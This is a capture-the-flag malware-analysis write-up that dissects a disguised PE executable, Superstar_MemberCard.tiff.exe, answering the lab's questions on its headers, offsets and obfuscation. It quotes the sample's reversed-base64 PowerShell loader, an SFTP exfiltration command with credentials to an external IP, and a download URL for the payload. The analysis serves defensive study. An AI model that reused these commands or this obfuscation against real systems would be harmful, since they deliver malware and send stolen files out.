# HeartBreaker Continuum

- Anslyzing the file binary given to us.
```sh
file Superstar_MemberCard.tiff.exe 
Superstar_MemberCard.tiff.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 section
```
- We can see that it's a 32 bit Portable Executable, the second question asks about the file creation date as per the metadata. For doing so we can use **readpe**.
```sh
readpe  can  read  and  display all PE file headers, fields and values. It's part of pev, the PE file analysis toolkit.
readpe Superstar_MemberCard.tiff.exe
DOS Header
    Magic number:                    0x5a4d (MZ)
    Bytes in last page:              144
    Pages in file:                   3
    Relocations:                     0
    Size of header in paragraphs:    4
    Minimum extra paragraphs:        0
    Maximum extra paragraphs:        65535
    Initial (relative) SS value:     0
    Initial SP value:                0xb8
    Initial IP value:                0
    Initial (relative) CS value:     0
    Address of relocation table:     0x40
    Overlay number:                  0
    OEM identifier:                  0
    OEM information:                 0
    PE header offset:                0x80
COFF/File header
    Machine:                         0x14c IMAGE_FILE_MACHINE_I386
    Number of sections:              3
    Date/time stamp:                 1710326286 (Wed, 13 Mar 2024 10:38:06 UTC)
    Symbol Table offset:             0
    Number of symbols:               0
    Size of optional header:         0xe0
    Characteristics:                 0x102
```

- Third question asks us about byte size of the code in the binary, the response of readpe provides this as well.
```sh
Sections
    Section
        Name:                            .text
        Virtual Size:                    0x9514 (38164 bytes)
        Virtual Address:                 0x2000
        Size Of Raw Data:                0x9600 (38400 bytes)
        Pointer To Raw Data:             0x200
        Number Of Relocations:           0
        Characteristics:                 0x60000020
        Characteristic Names
                                             IMAGE_SCN_CNT_CODE
                                             IMAGE_SCN_MEM_EXECUTE
                                             IMAGE_SCN_MEM_READ
```

- The next tasks asks us to identify the original name of the binary, for this we might be able to pull some information from the binary using strings functionality.
- Our next task is to get the hexadecimal offset where the obfunscated code of the original file begins. For this purpose we'll see the content using hexdump and try to identify the offset. We know that the code is obfuscated so we have to look for term which dictates the starting of obfuscated code. For there that term is `sCrt`
```sh
00002c70  36 1e 00 00 24 73 43 72  74 20 3d 20 22 3d 3d 67  |6...$sCrt = "==g|
00002c80  43 4e 55 32 59 79 39 6d  52 74 41 53 5a 7a 4a 58  |CNU2Yy9mRtASZzJX|
00002c90  64 6a 56 6d 55 74 41 69  63 70 52 45 64 6c 64 6d  |djVmUtAicpREdldm|
00002ca0  63 68 52 48 4a 67 67 47  64 68 42 56 4c 67 30 57  |chRHJggGdhBVLg0W|
```
- From the above we can see that the starting of this is 4 byte from the offset so 2C74.
- For the next question we have to speicy which encoding the threat actor used for concealing the plain text script. From the output of strings we can see that *Reverse* method has been used for getting the enc from the sCrt. From by looking at the encoded string we can see double equals at end which do dictates that it's a base64 encoding and apart from this the next statement uses *fRoMbASe64sTrInG*.
```sh
enC = $sCrt.ToCharArray() ; [array]::Reverse($enC) ; -join $enC 2>&1> $null ;
$bOom = [sYsTeM.tExT.eNcOdInG]::uTf8.GeTsTrInG([sYsTeM.cOnVeRt]::fRoMbASe64sTrInG("$enC")) ;
```
- Now we have to get the plain text code for further analysis for doing so we can either uuse cyber chef with two methods Reverse and then from Base64 or if we want to do locally
```sh
python
str = "paste-the-encoded-string-here"
str = str[::-1]

echo "str-value-from-above" | base64 -d > decoded.txt
```
- We are asked for cmdlets which initiate file download, cmdlets are native PowerShell commands, and the one used here is *Invoke-WebRequest*.
- Next we have to identify network-related activities going on, from the code we got we can see that first there is a SFTP connection that is being opened, and after that we can see that the attacker has given a href for Superstar_MemberCard.tiff.exe.
```
open sftp://service:M8&C!i6KkmGL1-#@35.169.66.138/ -hostkey=*
http://44.206.187.144:9000/Superstar_MemberCard.tiff.exe
```
- Next we have to get the staging directory which is mentioned as a string variable under variable name `targetDir = "C:\Users\Public\Public Files"`.
- Our next task is to identify MITRE ID for the technique used to autonomously gather data. We can just search this same term and we get T1119 ID which explains how attackers can gather internal data in automated way using Command and Scripting Interpreter.
- The last task is to get the password for exfiltration of the files collected. This we can see from the sftp connection.

- While working with a windows based environment we can use PEStudio for the tasks we did using readpe and strings.

**Completed**
